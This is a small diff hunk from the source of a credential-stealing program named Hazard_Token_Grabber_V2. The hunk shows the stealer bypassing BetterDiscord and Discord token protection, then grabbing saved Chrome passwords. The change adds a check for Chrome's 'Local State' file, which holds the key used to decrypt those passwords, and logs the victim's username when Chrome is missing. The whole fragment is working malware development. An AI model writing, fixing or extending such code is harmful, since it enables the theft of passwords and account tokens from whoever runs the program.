@@ -34,7 +34,7 @@ class Hazard_Token_Grabber_V2:
         if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
             self.bypass_better_discord()
         self.bypassTokenProtector()
-        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data'):
+        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
